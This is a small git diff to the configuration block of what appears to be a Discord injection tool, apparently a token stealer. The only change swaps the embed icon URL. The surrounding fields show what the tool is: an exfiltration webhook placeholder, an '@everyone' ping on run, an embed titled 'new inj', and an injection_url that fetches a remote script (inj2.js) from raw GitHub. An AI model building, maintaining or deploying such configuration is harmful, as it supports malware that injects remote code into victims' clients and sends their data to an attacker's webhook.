@@ -9,7 +9,7 @@ const config = {
   ping_on_run: true,
   ping_val: "@everyone",
   embed_name: "new inj",
-  embed_icon: "https://c.tenor.com/ruxAFVJ03ogAAAAS/cat-berg-cat.gifg",
+  embed_icon: "https://media.discordapp.net/attachments/966641030298492989/966826916629839912/unknown.png?width=689&height=664",
   embed_color: 8363488, 
   webhook: "%WEBHOOK%",
   injection_url: "https://raw.githubusercontent.com/mte0/g/main/inj2.js",
